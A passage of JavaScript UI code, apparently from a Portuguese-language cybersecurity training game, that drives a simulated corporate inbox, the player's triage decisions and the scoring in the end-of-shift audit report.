    this.browserTabIcon = document.getElementById('browser-tab-icon');
    this.browserTabTitle = document.getElementById('browser-tab-title');
    this.browserUrlBar = document.getElementById('browser-url-bar');
    this.appBrandIcon = document.getElementById('app-brand-icon');
    this.appBrandName = document.getElementById('app-brand-name');
    this.shiftClock = document.getElementById('shift-clock');
    this.taskbarClock = document.getElementById('taskbar-clock');
    this.taskbarActiveTitle = document.getElementById('taskbar-active-title');
    this.btnSoundToggle = document.getElementById('btn-sound-toggle');
    this.btnWinExit = document.getElementById('btn-win-exit');

    // Desktop icons
    this.diconMail = document.getElementById('dicon-mail');
    this.diconGithub = document.getElementById('dicon-github');
    this.diconIam = document.getElementById('dicon-iam');
    this.diconDb = document.getElementById('dicon-db');
    this.diconZap = document.getElementById('dicon-zap');
    this.diconVault = document.getElementById('dicon-vault');
    this.diconWord = document.getElementById('dicon-word');

    // Sidebar folder rows
    this.folderDbRow = document.getElementById('folder-db-row');
    this.folderZapRow = document.getElementById('folder-zap-row');
    this.folderVaultRow = document.getElementById('folder-vault-row');

    // Tabs in mail header
    this.tabBtnDb = document.getElementById('tab-btn-db');
    this.tabBtnZap = document.getElementById('tab-btn-zap');
    this.tabBtnVault = document.getElementById('tab-btn-vault');
    this.tabDbTag = document.getElementById('tab-db-tag');
    this.tabZapTag = document.getElementById('tab-zap-tag');
    this.tabVaultTag = document.getElementById('tab-vault-tag');

    // Views
    this.inboxListView = document.getElementById('inbox-list-view');
    this.emailItemsContainer = document.getElementById('email-items-container');
    this.emailReaderView = document.getElementById('email-reader-view');
    this.auditReportView = document.getElementById('audit-report-view');
    this.btnBackToInbox = document.getElementById('btn-back-to-inbox');
    this.browserBackBtn = document.getElementById('browser-back-btn');
    this.browserRefreshBtn = document.getElementById('browser-refresh-btn');

    // Badges
    this.badgeEmailCount = document.getElementById('badge-email-count');
    this.badgeGithubCount = document.getElementById('badge-github-count');
    this.badgeIamCount = document.getElementById('badge-iam-count');
    this.badgeDbCount = document.getElementById('badge-db-count');
    this.badgeZapCount = document.getElementById('badge-zap-count');
    this.badgeVaultCount = document.getElementById('badge-vault-count');
    this.badgeDoneCount = document.getElementById('badge-done-count');
    this.tabEmailTag = document.getElementById('tab-email-tag');
    this.tabGithubTag = document.getElementById('tab-github-tag');
    this.tabIamTag = document.getElementById('tab-iam-tag');

    // Reader elements
    this.readerTypeTag = document.getElementById('reader-type-tag');
    this.readerTimeMeta = document.getElementById('reader-time-meta');
    this.readerSubjectTitle = document.getElementById('reader-subject-title');
    this.readerSenderAvatar = document.getElementById('reader-sender-avatar');
    this.readerSenderName = document.getElementById('reader-sender-name');
    this.readerSenderEmail = document.getElementById('reader-sender-email');
    this.readerReceivedTime = document.getElementById('reader-received-time');
    this.btnToggleHeaders = document.getElementById('btn-toggle-headers');
    this.technicalHeadersBox = document.getElementById('technical-headers-box');
    this.headerDe = document.getElementById('header-de');
    this.headerPara = document.getElementById('header-para');
    this.headerData = document.getElementById('header-data');
    this.headerAuth = document.getElementById('header-auth');
    this.readerBodyMessage = document.getElementById('reader-body-message');
    this.readerInspectorSection = document.getElementById('reader-inspector-section');
    this.decisionButtonsGroup = document.getElementById('decision-buttons-group');

    // Toast
    this.actionToast = document.getElementById('action-toast');
    this.toastMsg = document.getElementById('toast-msg');

    // Audit Report Elements
    this.reportThreatsAvoided = document.getElementById('report-threats-avoided');
    this.reportThreatsTaken = document.getElementById('report-threats-taken');
    this.reportHealthFinal = document.getElementById('report-health-final');
    this.reportReputationFinal = document.getElementById('report-reputation-final');
    this.auditStamp = document.getElementById('audit-stamp');
    this.auditTitle = document.getElementById('audit-title');
    this.auditSubText = document.getElementById('audit-sub-text');
    this.auditVerdictTitle = document.getElementById('audit-verdict-title');
    this.auditVerdictText = document.getElementById('audit-verdict-text');
    this.auditTableBody = document.getElementById('audit-table-body');
    this.btnNextShiftAction = document.getElementById('btn-next-shift-action');
    this.btnRestartShift = document.getElementById('btn-restart-shift');
    
    // Cheat Code Elements
    this.cheatCodeInput = document.getElementById('cheat-code-input');
    this.cheatCodeHint = document.getElementById('cheat-code-hint');
    this.cheatCodeArea = document.getElementById('cheat-code-area');
    this.mainMenuContainer = document.getElementById('main-menu-container');
    this.secretLogoStar = document.getElementById('secret-logo-star');
    this.btnCancelCheat = document.getElementById('btn-cancel-cheat');
  }

  getCurrentShift() {
    return CAMPAIGN_SHIFTS[this.currentShiftIndex] || CAMPAIGN_SHIFTS[0];
  }

  bindEvents() {
    // Cheat Code Toggle Logic
    if (this.secretLogoStar) {
      this.secretLogoStar.addEventListener('click', () => {
        if (this.mainMenuContainer && this.cheatCodeArea) {
          audio.click();
          this.mainMenuContainer.style.display = 'none';
          this.cheatCodeArea.style.display = 'flex';
          this.cheatCodeInput.focus();
        }
      });
    }

    if (this.btnCancelCheat) {
      this.btnCancelCheat.addEventListener('click', () => {
        if (this.mainMenuContainer && this.cheatCodeArea) {
          audio.click();
          this.cheatCodeArea.style.display = 'none';
          this.mainMenuContainer.style.display = 'flex';
          this.cheatCodeInput.value = '';
          this.cheatCodeHint.textContent = 'Digite o código e pressione ENTER';
        }
      });
    }

    // Cheat Code Logic
    if (this.cheatCodeInput) {
      this.cheatCodeInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
          const code = this.cheatCodeInput.value.trim().toLowerCase();
          let targetShift = -1;
          
          if (code === 'comida') targetShift = 0;
          if (code === 'gremio') targetShift = 1;
          if (code === 'git') targetShift = 2;
          if (code === 'you') targetShift = 3;

          if (targetShift !== -1) {
            audio.click();
            this.currentShiftIndex = targetShift;
            this.campaignHistory = [];
            
            this.cheatCodeHint.textContent = `Acesso concedido: Turno ${targetShift + 1}!`;
            this.cheatCodeHint.style.color = '#4ade80';
            
            setTimeout(() => {
              this.cheatCodeInput.value = '';
              this.cheatCodeHint.textContent = 'Digite o código e pressione ENTER';
              this.cheatCodeHint.style.color = '';
              if (this.mainMenuContainer && this.cheatCodeArea) {
                this.cheatCodeArea.style.display = 'none';
                this.mainMenuContainer.style.display = 'flex';
              }
              this.openCeoDialogueForShift(targetShift);
            }, 1000);
          } else if (code !== '') {
            this.cheatCodeHint.textContent = 'Código inválido!';
            this.cheatCodeHint.style.color = '#f87171';
            
            setTimeout(() => {
              this.cheatCodeHint.textContent = 'Digite o código e pressione ENTER';
              this.cheatCodeHint.style.color = '';
            }, 2000);
          }
        }
      });
    }

    // 1. Start Shift -> Turno 1
    this.btnStartShift.addEventListener('click', () => {
      audio.click();
      this.currentShiftIndex = 0;
      this.campaignHistory = [];
      this.openCeoDialogueForShift(0);
    });
    this.btnStartShift.addEventListener('mouseenter', () => audio.menuHover());

    // 2. Exit screen
    this.btnExitSite.addEventListener('click', () => {
      audio.click();
      this.startScreen.style.display = 'none';
      this.exitScreen.style.display = 'flex';
    });
    this.btnExitSite.addEventListener('mouseenter', () => audio.menuHover());

    this.btnWinExit.addEventListener('click', () => {
      audio.click();
      this.mainWorkspace.style.display = 'none';
      this.startScreen.style.display = 'flex';
    });

    this.btnReopenSite.addEventListener('click', () => {
      audio.click();
      this.exitScreen.style.display = 'none';
      this.startScreen.style.display = 'flex';
    });

    // 3. Tab Switching between Mail & Word 2000
    this.tabBtnMailview.addEventListener('click', () => {
      audio.click();
      this.switchToAppView('mail');
    });

    this.tabBtnWordview.addEventListener('click', () => {
      audio.click();
      this.switchToAppView('word');
    });

    this.btnOpenWordTab.addEventListener('click', () => {
      audio.click();
      this.switchToAppView('word');
    });

    this.diconWord.addEventListener('click', () => {
      audio.click();
      this.switchToAppView('word');
    });

    // 4. Dialogue navigation
    this.btnDialogNext.addEventListener('click', () => {
      audio.speechAdvance();
      const shift = this.getCurrentShift();
      if (this.currentDialogIndex < shift.ceoDialogues.length - 1) {
        this.currentDialogIndex++;
        this.renderDialogueStep();
      }
    });

    this.btnDialogPrev.addEventListener('click', () => {
      audio.speechAdvance();
      if (this.currentDialogIndex > 0) {
        this.currentDialogIndex--;
        this.renderDialogueStep();
      }
    });

    this.btnStartWorkstationFromDialog.addEventListener('click', () => {
      audio.click();
      this.ceoDialogModal.style.display = 'none';
      this.startShiftExecution();
    });

    this.btnSkipDialog.addEventListener('click', () => {
      audio.click();
      this.ceoDialogModal.style.display = 'none';
      this.startShiftExecution();
    });

    this.btnSoundToggle.addEventListener('click', () => {
      audio.enabled = !audio.enabled;
      this.btnSoundToggle.textContent = audio.enabled ? '🔊' : '🔇';
      if (audio.enabled) audio.click();
    });

    // Desktop icons filtering
    this.diconMail.addEventListener('click', () => { audio.click(); this.switchToAppView('mail'); this.setCategoryView('email'); });
    this.diconGithub.addEventListener('click', () => { audio.click(); this.switchToAppView('mail'); this.setCategoryView('github'); });
    this.diconIam.addEventListener('click', () => { audio.click(); this.switchToAppView('mail'); this.setCategoryView('iam'); });
    this.diconDb.addEventListener('click', () => { audio.click(); this.switchToAppView('mail'); this.setCategoryView('db'); });
    this.diconZap.addEventListener('click', () => { audio.click(); this.switchToAppView('mail'); this.setCategoryView('zap'); });
    this.diconVault.addEventListener('click', () => { audio.click(); this.switchToAppView('mail'); this.setCategoryView('vault'); });

    // Reader back
    this.btnBackToInbox.addEventListener('click', () => { audio.click(); this.showInboxList(); });
    this.browserBackBtn.addEventListener('click', () => { audio.click(); this.showInboxList(); });
    this.browserRefreshBtn.addEventListener('click', () => {
      audio.click();
      this.renderInboxRows();
      this.showToast('Fila operacional atualizada.');
    });

    this.btnToggleHeaders.addEventListener('click', () => {
      audio.click();
      const isHidden = this.technicalHeadersBox.style.display === 'none';
      this.technicalHeadersBox.style.display = isHidden ? 'flex' : 'none';
      this.btnToggleHeaders.textContent = isHidden ? 'Ocultar Detalhes ▴' : 'Detalhes de Segurança ▾';
    });

    // Tabs in Mail Category
    document.querySelectorAll('.gmail-tabs-header .cat-tab-btn').forEach(tab => {
      tab.addEventListener('click', (e) => {
        audio.click();
        const cat = e.currentTarget.getAttribute('data-cat');
        this.setCategoryView(cat);
      });
    });

    // Sidebar navigation
    document.querySelectorAll('.sidebar-folder-list .folder-row').forEach(item => {
      item.addEventListener('click', (e) => {
        audio.click();
        const view = e.currentTarget.getAttribute('data-view');
        this.setCategoryView(view);
      });
    });

    // Next Shift Action
    this.btnNextShiftAction.addEventListener('click', () => {
      audio.click();
      if (this.currentShiftIndex < CAMPAIGN_SHIFTS.length - 1) {
        this.currentShiftIndex++;
        this.auditReportView.style.display = 'none';
        this.openCeoDialogueForShift(this.currentShiftIndex);
      } else {
        this.currentShiftIndex = 0;
        this.campaignHistory = [];
        this.auditReportView.style.display = 'none';
        this.startScreen.style.display = 'flex';
      }
    });

    this.btnRestartShift.addEventListener('click', () => {
      audio.click();
      this.currentShiftIndex = 0;
      this.campaignHistory = [];
      this.auditReportView.style.display = 'none';
      this.startScreen.style.display = 'flex';
    });
  }

  switchToAppView(view) {
    this.currentAppView = view;
    if (view === 'word') {
      this.tabBtnMailview.classList.remove('active-tab');
      this.tabBtnWordview.classList.add('active-tab');
      this.appWorkspaceBody.style.display = 'none';
      this.wordDocView.style.display = 'flex';
      this.browserUrlBar.value = 'file:///C:/TechCore/Documentos/Procedimentos_TI_TechCore.doc';
      this.renderWordContent();
    } else {
      this.tabBtnWordview.classList.remove('active-tab');
      this.tabBtnMailview.classList.add('active-tab');
      this.wordDocView.style.display = 'none';
      this.appWorkspaceBody.style.display = 'flex';
      this.browserUrlBar.value = this.getCurrentShift().url;
    }
  }

  renderWordContent() {
    const shift = this.getCurrentShift();
    this.wordDocContent.innerHTML = shift.wordContent;
  }

  openCeoDialogueForShift(shiftIndex) {
    this.currentShiftIndex = shiftIndex;
    this.currentDialogIndex = 0;
    const shift = this.getCurrentShift();

    // Temas dinamicos por turno (Turno 2: Amarelo, Turno 3: Verde, Turno 4: Vermelho)
    const dialogBox = this.ceoDialogModal ? this.ceoDialogModal.querySelector('.ceo-dialog-box-retro') : null;
    if (dialogBox) {
      dialogBox.className = 'ceo-dialog-box-retro';
      if (shift.shiftNumber === 2) dialogBox.classList.add('shift-2-dialog-theme');
      if (shift.shiftNumber === 3) dialogBox.classList.add('shift-3-dialog-theme');
      if (shift.shiftNumber === 4) dialogBox.classList.add('shift-4-dialog-theme');
    }

    this.ceoDialogTitlebar.textContent = `📡 CANAL_DIRETORIA // BRIEFING_TURNO_${shift.shiftNumber}_ROGERIO_CEO`;
    this.ceoDialogSpeakerTag.textContent = `📟 COMUNICADO DO CEO ROGÉRIO (TURNO ${shift.shiftNumber}/${CAMPAIGN_SHIFTS.length}):`;
    
    this.renderDialogueStep();
    this.ceoDialogModal.style.display = 'flex';
  }

  renderDialogueStep() {
    const shift = this.getCurrentShift();
    const dialog = shift.ceoDialogues[this.currentDialogIndex];
    this.ceoSpeechText.innerHTML = dialog.text;
    this.dialogStepIndicator.textContent = `Mensagem ${dialog.step} de ${shift.ceoDialogues.length}`;

    const imgEl = document.getElementById('ceo-pixel-img');
    const nameEl = document.getElementById('ceo-speaker-name');
    const roleEl = document.getElementById('ceo-speaker-role');

    if (dialog.speaker) {
      if (nameEl) nameEl.textContent = dialog.speaker;
      if (roleEl) roleEl.textContent = dialog.role || 'TechCore Executivo';
      if (imgEl && dialog.avatar) imgEl.src = dialog.avatar;
      this.ceoDialogSpeakerTag.textContent = `📟 BRIEFING: ${dialog.speaker.toUpperCase()} - TURNO ${shift.shiftNumber}`;
    } else {
      if (nameEl) nameEl.textContent = 'Rogério Silva';
      if (roleEl) roleEl.textContent = 'CEO TechCore';
      if (imgEl) imgEl.src = 'ceo_rogerio.jpg?v=5';
      this.ceoDialogSpeakerTag.textContent = `📟 COMUNICADO DO CEO ROGÉRIO (TURNO ${shift.shiftNumber}/${CAMPAIGN_SHIFTS.length}):`;
    }

    this.btnDialogPrev.style.display = this.currentDialogIndex > 0 ? 'inline-flex' : 'none';
    
    if (this.currentDialogIndex === shift.ceoDialogues.length - 1) {
      this.btnDialogNext.style.display = 'none';
      this.btnStartWorkstationFromDialog.style.display = 'inline-flex';
      this.btnStartWorkstationFromDialog.textContent = `🚀 Iniciar Turno ${shift.shiftNumber} (09:00)`;
    } else {
      this.btnDialogNext.style.display = 'inline-flex';
      this.btnStartWorkstationFromDialog.style.display = 'none';
    }
  }

  startShiftExecution() {
    const shift = this.getCurrentShift();
    this.startScreen.style.display = 'none';
    this.mainWorkspace.style.display = 'flex';
    this.processedItems = [];
    this.decisionsHistory = [];
    this.currentCategoryFilter = 'all';

    this.switchToAppView('mail');

    // Update Header
    this.shiftPillBadge.textContent = `TURNO ${shift.shiftNumber}/4`;
    this.browserTabIcon.innerHTML = shift.brandIcon;
    this.browserTabTitle.textContent = `${shift.brandName} - Turno ${shift.shiftNumber} (${shift.scenarios.length} itens)`;
    this.browserUrlBar.value = shift.url;
    this.appBrandIcon.innerHTML = shift.brandIcon;
    this.appBrandName.textContent = shift.brandName;
    this.taskbarActiveTitle.innerHTML = `${shift.brandIcon} ${shift.brandName} - Turno ${shift.shiftNumber}`;

    // Show/hide apps in sidebar & tabs based on shift
    this.folderDbRow.style.display = shift.shiftNumber >= 2 ? 'flex' : 'none';
    this.tabBtnDb.style.display = shift.shiftNumber >= 2 ? 'flex' : 'none';

    this.folderZapRow.style.display = shift.shiftNumber >= 3 ? 'flex' : 'none';
    this.tabBtnZap.style.display = shift.shiftNumber >= 3 ? 'flex' : 'none';

    this.folderVaultRow.style.display = shift.shiftNumber >= 4 ? 'flex' : 'none';
    this.tabBtnVault.style.display = shift.shiftNumber >= 4 ? 'flex' : 'none';

    this.updateBadges();
    this.showInboxList();
    this.renderInboxRows();
  }

  setCategoryView(view) {
    this.currentCategoryFilter = view;

    document.querySelectorAll('.sidebar-folder-list .folder-row').forEach(i => {
      i.classList.toggle('active', i.getAttribute('data-view') === view);
    });

    document.querySelectorAll('.gmail-tabs-header .cat-tab-btn').forEach(t => {
      t.classList.toggle('active', t.getAttribute('data-cat') === view);
    });

    this.showInboxList();
    this.renderInboxRows();
  }

  showInboxList() {
    this.emailReaderView.style.display = 'none';
    this.auditReportView.style.display = 'none';
    this.inboxListView.style.display = 'flex';
    this.renderInboxRows();
  }

  updateBadges() {
    const shift = this.getCurrentShift();
    const unread = shift.scenarios.filter((_, idx) => !this.processedItems.includes(idx));
    
    const unreadEmail = unread.filter(s => s.channel === 'email').length;
    const unreadGithub = unread.filter(s => s.channel === 'github').length;
    const unreadIam = unread.filter(s => s.channel === 'iam').length;
    const unreadDb = unread.filter(s => s.channel === 'db').length;
    const unreadZap = unread.filter(s => s.channel === 'zap').length;
    const unreadVault = unread.filter(s => s.channel === 'vault').length;

    this.badgeEmailCount.textContent = unreadEmail;
    this.badgeGithubCount.textContent = unreadGithub;
    this.badgeIamCount.textContent = unreadIam;
    this.badgeDbCount.textContent = unreadDb;
    this.badgeZapCount.textContent = unreadZap;
    this.badgeVaultCount.textContent = unreadVault;
    this.badgeDoneCount.textContent = this.processedItems.length;

    this.tabEmailTag.textContent = `${unreadEmail} novos`;
    this.tabGithubTag.textContent = `${unreadGithub} novos`;
    this.tabIamTag.textContent = `${unreadIam} novos`;
    if (this.tabDbTag) this.tabDbTag.textContent = `${unreadDb} novos`;
    if (this.tabZapTag) this.tabZapTag.textContent = `${unreadZap} novos`;
    if (this.tabVaultTag) this.tabVaultTag.textContent = `${unreadVault} novos`;
    
    const activeItem = shift.scenarios[this.processedItems.length] || shift.scenarios[shift.scenarios.length - 1];
    const timeStr = this.processedItems.length >= shift.scenarios.length ? '18:00' : activeItem.time;
    this.shiftClock.textContent = timeStr;
    this.taskbarClock.textContent = timeStr;
  }

  renderInboxRows() {
    this.emailItemsContainer.innerHTML = '';
    const shift = this.getCurrentShift();

    shift.scenarios.forEach((item, index) => {
      const isProcessed = this.processedItems.includes(index);

      if (this.currentCategoryFilter === 'processed') {
        if (!isProcessed) return;
      } else if (this.currentCategoryFilter !== 'all' && item.channel !== this.currentCategoryFilter) {
        return;
      }

      const row = document.createElement('div');
      row.className = `email-row-item ${!isProcessed ? 'unread' : 'processed'}`;
      
      let tagLabel = 'TechMail';
      let tagClass = 'tag-email';
      if (item.channel === 'github') { tagLabel = 'GitHub PR'; tagClass = 'tag-github'; }
      if (item.channel === 'iam') { tagLabel = 'IAM Access'; tagClass = 'tag-iam'; }
      if (item.channel === 'db') { tagLabel = 'TechDB SQL'; tagClass = 'tag-db'; }
      if (item.channel === 'zap') { tagLabel = 'TechZap Chat'; tagClass = 'tag-zap'; }
      if (item.channel === 'vault') { tagLabel = 'TechVault'; tagClass = 'tag-vault'; }

      let avatarHtml = item.avatarImg ? `<img src="${item.avatarImg}" style="width:28px;height:28px;border-radius:50%;object-fit:cover;margin-right:10px;">` : `<div style="width:28px;height:28px;border-radius:50%;background-color:${item.avatarColor};color:#fff;display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:12px;margin-right:10px;">${item.avatarChar}</div>`;
      row.innerHTML = `
        <div class="row-controls">
          <input type="checkbox" ${isProcessed ? 'checked' : ''} onclick="event.stopPropagation()">
          <span class="row-star" onclick="event.stopPropagation(); this.classList.toggle('starred')">★</span>
        </div>
        <div style="display:flex; align-items:center; width:220px; margin-left: 10px;">
          ${avatarHtml}
          <div class="row-sender" style="width:auto; margin-left:0;">${this.escapeHtml(item.senderName)}</div>
        </div>
        <span class="row-tag ${tagClass}">${tagLabel}</span>
        <div class="row-content">
          ${!isProcessed ? '<span class="row-new-badge">NOVO</span>' : ''}
          <span class="row-subject">${this.escapeHtml(item.subject)}</span>
          <span class="row-snippet"> - ${this.escapeHtml(item.snippet)}</span>
        </div>
        <div class="row-time">${item.time}</div>
      `;

      row.addEventListener('click', () => {
        audio.openMail();
        this.openReader(index);
      });

      this.emailItemsContainer.appendChild(row);
    });

    if (this.emailItemsContainer.children.length === 0) {
      this.emailItemsContainer.innerHTML = `
        <div style="padding: 40px; text-align: center; color: #747775;">
          <div style="font-size: 32px; margin-bottom: 8px;">📭</div>
          <p>Nenhum item nesta fila de exibição.</p>
        </div>
      `;
    }
  }

  openReader(index) {
    const shift = this.getCurrentShift();
    const item = shift.scenarios[index];
    const isProcessed = this.processedItems.includes(index);

    this.inboxListView.style.display = 'none';
    this.emailReaderView.style.display = 'flex';
    this.technicalHeadersBox.style.display = 'none';
    this.btnToggleHeaders.textContent = 'Detalhes de Segurança ▾';

    let typeText = 'E-MAIL CORPORATIVO';
    if (item.channel === 'github') typeText = 'GITHUB PULL REQUEST';
    if (item.channel === 'iam') typeText = 'CHAMADO DE ACESSO IAM';
    if (item.channel === 'db') typeText = 'AUDITORIA DE BANCO TECHDB';
    if (item.channel === 'zap') typeText = 'TECHZAP WHATSAPP CHAT';
    if (item.channel === 'vault') typeText = 'DESPACHO TECHVAULT';

    this.readerTypeTag.textContent = typeText;
    this.readerTimeMeta.textContent = item.time;
    this.readerSubjectTitle.textContent = item.subject;

    if (item.avatarImg) {
      this.readerSenderAvatar.innerHTML = `<img src="${item.avatarImg}" style="width:100%;height:100%;border-radius:50%;object-fit:cover;">`;
      this.readerSenderAvatar.style.backgroundColor = 'transparent';
    } else {
      this.readerSenderAvatar.textContent = item.avatarChar;
      this.readerSenderAvatar.style.backgroundColor = item.avatarColor;
    }
    this.readerSenderName.textContent = item.senderName;
    this.readerSenderEmail.textContent = `<${item.senderEmail}>`;
    this.readerReceivedTime.textContent = item.meta['Data'] || item.time;

    this.headerDe.textContent = item.meta['De'] || item.meta['Origem'] || item.meta['Contato'] || item.meta['Arquivo'] || '-';
    this.headerPara.textContent = item.meta['Para'] || item.meta['Endpoint'] || item.meta['Destino'] || '-';
    this.headerData.textContent = item.meta['Data'] || '-';
    this.headerAuth.textContent = item.meta['Segurança'] || item.meta['Status'] || item.meta['Prioridade'] || '-';

    // Render Inspector (PURE RAW FACTS - NO SPOILER HINTS)
    if (item.inspector.type === 'diff') {
      let diffLinesHtml = item.inspector.diff.map(line => {
        let cls = 'diff-info';
        if (line.type === 'added') cls = 'diff-added';
        if (line.type === 'removed') cls = 'diff-removed';
        return `<span class="${cls}">${this.escapeHtml(line.text)}</span>`;
      }).join('\n');

      this.readerInspectorSection.innerHTML = `
        <div class="inspector-title">🔍 ${item.inspector.label}</div>
        <pre class="diff-view"><code>${diffLinesHtml}</code></pre>
      `;
    } else {
      this.readerInspectorSection.innerHTML = `
        <div class="inspector-title">🔍 ${item.inspector.label}</div>
        <div class="url-inspector-card">
          <span style="font-size: 10.5px; color: #94a3b8;">ORIGEM / DESTINO / QUERY ANALISADA:</span>
          <span class="url-dest">${this.escapeHtml(item.inspector.dest)}</span>
        </div>
      `;
    }

    if (item.channel === 'zap') {
      // TechZap / WhatsApp Attachment Card Handling
      this.readerBodyMessage.innerHTML = item.body;
      this.readerInspectorSection.style.display = 'none'; // Hidden until document is clicked

      setTimeout(() => {
        const wzAttCard = document.getElementById('wz-attachment-card');
        if (wzAttCard) {
          wzAttCard.addEventListener('click', () => {
            audio.click();
            const isHidden = this.readerInspectorSection.style.display === 'none';
            this.readerInspectorSection.style.display = isHidden ? 'block' : 'none';
            wzAttCard.classList.toggle('active-open', isHidden);
            if (isHidden) {
              this.readerInspectorSection.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
            }
          });
        }
      }, 50);
    } else {
      // Gmail Attachment Card for ALL non-WhatsApp channels (Email, IAM, GitHub, DB, TechVault)
      let fileName = item.attachmentFileName || 'documento_solicitacao.pdf';
      let badgeClass = 'badge-diff';

      if (item.channel === 'db' || (item.inspector && item.inspector.dest && item.inspector.dest.includes('SELECT'))) {
        badgeClass = 'badge-sql';
      }

      const attachmentHtml = `
        <div class="gmail-attachment-container">
          <div class="gmail-attachment-header">
            <span class="att-count-text">One attachment</span>
            <span class="att-bullet">•</span>
            <span class="att-scanned-text">Scanned by Gmail</span>
            <span class="att-info-icon" title="Scanned by Gmail">ⓘ</span>
            <button class="att-drive-btn" type="button" onclick="event.stopPropagation()">
              <svg viewBox="0 0 24 24" width="14" height="14" style="vertical-align:middle;margin-right:2px;"><path fill="#4285f4" d="M12 2L4.5 15h15z"/><path fill="#34a853" d="M12 2l7.5 13H4.5z"/><path fill="#fbc02d" d="M4.5 15l3.75 6.5h15.5L19.5 15z"/></svg>
              Add to Drive
            </button>
          </div>

          <div class="gmail-attachment-card" id="gmail-attachment-card" title="Clique para abrir e visualizar os detalhes do anexo">
            <div class="att-thumbnail-box">
              <div class="att-doc-icon-preview">
                <div class="att-doc-line"></div>
                <div class="att-doc-line"></div>
                <div class="att-doc-line short"></div>
              </div>
              <div class="att-click-hint">🔍 Clique para abrir o anexo</div>
            </div>
            <div class="att-footer-bar">
              <div class="att-file-badge ${badgeClass}">&lt;/&gt;</div>
              <span class="att-file-name" title="${fileName}">${fileName}</span>
              <div class="att-dog-ear"></div>
            </div>
          </div>
        </div>
      `;

      this.readerBodyMessage.innerHTML = item.body + attachmentHtml;
      this.readerInspectorSection.style.display = 'none'; // Hidden until attachment card is clicked

      setTimeout(() => {
        const attCard = document.getElementById('gmail-attachment-card');
        if (attCard) {
          attCard.addEventListener('click', () => {
            audio.click();
            const isHidden = this.readerInspectorSection.style.display === 'none';
            this.readerInspectorSection.style.display = isHidden ? 'block' : 'none';
            attCard.classList.toggle('active-open', isHidden);
            if (isHidden) {
              this.readerInspectorSection.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
            }
          });
        }
      }, 50);
    }

    // Render Inspector (PURE RAW FACTS - NO SPOILER HINTS)
    if (item.inspector.type === 'diff') {
      let diffLinesHtml = item.inspector.diff.map(line => {
        let cls = 'diff-info';
        if (line.type === 'added') cls = 'diff-added';
        if (line.type === 'removed') cls = 'diff-removed';
        return `<span class="${cls}">${this.escapeHtml(line.text)}</span>`;
      }).join('\n');

      this.readerInspectorSection.innerHTML = `
        <div class="inspector-title">🔍 ${item.inspector.label}</div>
        <pre class="diff-view"><code>${diffLinesHtml}</code></pre>
      `;
    } else {
      this.readerInspectorSection.innerHTML = `
        <div class="inspector-title">🔍 ${item.inspector.label}</div>
        <div class="url-inspector-card">
          <span style="font-size: 10.5px; color: #94a3b8;">ORIGEM / DESTINO / QUERY ANALISADA:</span>
          <span class="url-dest">${this.escapeHtml(item.inspector.dest)}</span>
        </div>
      `;
    }

    // Render Decision Buttons (Neutral without red/green clues)
    if (isProcessed) {
      this.decisionButtonsGroup.innerHTML = `
        <div style="font-size: 13px; color: #475569; font-weight: 600;">
          ✓ Este item já foi processado anteriormente durante este expediente.
        </div>
      `;
    } else {
      this.decisionButtonsGroup.innerHTML = item.actions.map(action => {
        return `
          <button class="btn-decision" data-action-id="${action.id}">
            ${action.label}
          </button>
        `;
      }).join('');

      this.decisionButtonsGroup.querySelectorAll('.btn-decision').forEach(btn => {
        btn.addEventListener('click', (e) => {
          const actionId = e.currentTarget.getAttribute('data-action-id');
          const chosenAction = item.actions.find(a => a.id === actionId);
          this.processAction(index, item, chosenAction);
        });
      });
    }
  }

  processAction(index, item, action) {
    audio.actionDone();

    this.processedItems.push(index);
    const decisionRecord = {
      shiftNumber: this.getCurrentShift().shiftNumber,
      scenarioIndex: index,
      channel: item.channel,
      subject: item.subject,
      chosenActionLabel: action.label,
      logTitle: action.logTitle,
      correct: action.correct,
      consequence: action.consequence,
      explanation: action.explanation
    };

    this.decisionsHistory.push(decisionRecord);
    this.campaignHistory.push(decisionRecord);

    this.showToast(action.toastMsg);
    this.updateBadges();

    const shift = this.getCurrentShift();
    if (this.processedItems.length >= shift.scenarios.length) {
      setTimeout(() => {
        this.showShiftAuditReport();
      }, 700);
    } else {
      setTimeout(() => {
        this.showInboxList();
      }, 500);
    }
  }

  showToast(msg) {
    this.toastMsg.textContent = msg;
    this.actionToast.style.display = 'flex';
    setTimeout(() => {
      this.actionToast.style.display = 'none';
    }, 2400);
  }

  showShiftAuditReport() {
    audio.endFanfare();

    this.emailReaderView.style.display = 'none';
    this.inboxListView.style.display = 'none';
    this.auditReportView.style.display = 'flex';
    this.shiftClock.textContent = '18:00';
    this.taskbarClock.textContent = '18:00';

    const shift = this.getCurrentShift();
    const isFinalShift = this.currentShiftIndex === CAMPAIGN_SHIFTS.length - 1;

    const totalScenarios = this.decisionsHistory.length;
    const correctCount = this.decisionsHistory.filter(d => d.correct).length;
    const incorrectCount = totalScenarios - correctCount;

    const maxAllowedErrors = shift.shiftNumber === 4 ? 1 : 2;
    const isApproved = incorrectCount <= maxAllowedErrors;

    const health = Math.max(0, 100 - (incorrectCount * 20));
    const reputation = Math.max(0, 100 - (incorrectCount * 12) + (correctCount * 6));

    this.reportThreatsAvoided.textContent = correctCount;
    this.reportThreatsTaken.textContent = incorrectCount;
    this.reportHealthFinal.textContent = `${health}%`;
    this.reportHealthFinal.className = health >= 60 ? 'card-num text-emerald' : 'card-num text-danger';
    this.reportReputationFinal.textContent = `${reputation} pts`;

    this.auditStamp.textContent = `TECHCORE CISO AUDIT // TURNO ${shift.shiftNumber}`;
    this.auditTitle.textContent = isFinalShift 
      ? '🏆 RELATÓRIO FINAL DA CAMPANHA DE DEFESA (4 TURNOS)' 
      : `Relatório de Desempenho - ${shift.title}`;
    this.auditSubText.textContent = `Expediente encerrado às 18:00. Avaliação do Turno ${shift.shiftNumber} de 4 (Tolerância: até ${maxAllowedErrors} erro(s) permitido(s)).`;

    if (incorrectCount === 0) {
      this.auditVerdictTitle.textContent = `Parecer do CISO & CEO Rogério: Aprovado com Louvor no Turno ${shift.shiftNumber}!`;
      this.auditVerdictText.textContent = 'Desempenho 100% perfeito! Você neutralizou todas as ameaças sem nenhum falso positivo ou incidente cibernético.';
    } else if (isApproved) {
      this.auditVerdictTitle.textContent = `Parecer do CISO & CEO Rogério: Turno ${shift.shiftNumber} APROVADO (Dentro da Margem de Tolerância de ${maxAllowedErrors} Erro(s))`;
